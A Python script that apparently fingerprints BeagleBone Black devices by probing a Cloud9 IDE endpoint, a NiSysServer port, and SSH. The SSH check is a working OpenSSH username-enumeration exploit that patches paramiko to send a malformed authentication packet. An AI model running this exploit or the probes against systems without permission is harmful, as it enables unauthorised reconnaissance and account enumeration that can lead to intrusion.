import requests
import argparse
import time
import logging
import paramiko
import socket
import sys
import warnings

warnings.filterwarnings(action='ignore',module='.*paramiko.*')

parser = argparse.ArgumentParser()
parser.add_argument('target',help="Set the address of target BBB host")
parser.add_argument('-c9','--cloud9-port', dest="c9port",help="Set the address cloud9 of port")
parser.add_argument('-Ni','-nisysserver-port',dest="nisysserver_port",help="Set the address NiSysServer.py port")
args = parser.parse_args()


sock = socket.socket()
try:
    sock.connect((args.target, 22))
    sock.timeout(5)
    sock.close()
except socket.error:
    print('[-] Connecting to host failed. Please check the specified host and port.')
    sys.exit(1)


# store function we will overwrite to malform the packet
old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

# create custom exception
class BadUsername(Exception):
	def __init__(self):
		pass

# create malicious "add_boolean" function to malform packet
def add_boolean(*args, **kwargs):
    pass

# create function to call when username was invalid
def call_error(*args, **kwargs):
    raise BadUsername()

# create the malicious function to overwrite MSG_SERVICE_ACCEPT handler
def malform_packet(*args, **kwargs):
    old_add_boolean = paramiko.message.Message.add_boolean
    paramiko.message.Message.add_boolean = add_boolean
    result  = old_parse_service_accept(*args, **kwargs)
    #return old add_boolean function so start_client will work again
    paramiko.message.Message.add_boolean = old_add_boolean
    return result


# create function to perform authentication with malformed packet and desired username
def checkUsername(username, tried=0):
	sock = socket.socket()
	sock.connect((args.target, 22))
	sock.timeout(5.0)
	# instantiate transport
	transport = paramiko.transport.Transport(sock)
	try:
	    transport.start_client()
	except paramiko.ssh_exception.SSHException:
	    # server was likely flooded, retry up to 3 times
	    transport.close()
	    if tried < 4:
	    	tried += 1
	    	return checkUsername(username, tried)
	    else:
	    	print('[-] Failed to negotiate SSH transport')
	try:
		transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
	except BadUsername:
    		return (username, False)
	except paramiko.ssh_exception.AuthenticationException:
    		return (username, True)
	#Successful auth(?)
	raise Exception("There was an error. Is this the correct version of OpenSSH?")


# assign functions to respective handlers
paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error

# get rid of paramiko logging
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())



def checkSSHEnumVulnerable():
	result = checkUsername("root")
	if result[1]:
		return 1
	else:
		return 0


def checkVulnerableCloud9():
	headers = {"User-Agent": "insomnia/7.1.1", "Accept": "*/*", "Connection": "close"}
	data = {"version": "13"}
	try:
		if args.c9port is not None:
			# print("[+] Sending requests to %s on port %s "%(args.target,args.c9port))
			url = "http://"+args.target+":"+args.c9port+"/vfs/1?access_token=token"
		else:
			# print("[+] Sending requests to %s on port 3000 "%args.target)
			url = "http://"+args.target+":3000/vfs/1?access_token=token"
		result = requests.post(url, headers=headers,data=data,timeout=5)
		json_result = result.json()
		# print(json_result)
		# print(json_result['vfsid'])
		if json_result.get('vfsid'):
			return 1
		else:
			return 0
	except Exception as e:
		return 0


def checkVulnerableNiSysServer():
	headers = {"User-Agent": "insomnia/7.1.1", "Accept": "*/*", "Connection": "close"}
	data = {"version": "13"}
	try:
		if args.nisysserver_port is not None:
			# print("[+] Sending requests to %s on port %s "%(args.target,args.nisysserver_port))
			url = "http://"+args.target+":"+args.nisysserver_port+"/vfs/1?access_token=token"
		else:
			# print("[+] Sending requests to %s on port 3580 "%args.target)
			url = "http://"+args.target+":3580/vfs/1?access_token=token"
		result = requests.get(url, headers=headers,timeout=5)
		result = result.text
		# print(json_result)
		# print(json_result['vfsid'])
		if "Error code explanation: 404 = Nothing matches the given URI." in result:
			return 1
		else:
			return 0
	except Exception as e:
		print(e)
		return 0



check_result = checkVulnerableCloud9() + checkVulnerableNiSysServer() + checkSSHEnumVulnerable()

probability = check_result/3;

print("Possibility of BBB at "+args.target+" is "+str(probability*100)+"%")

#url = "http://"+args.target+":"+args.port+"/vfs/1?access_token=token"

# Assuming count is positive






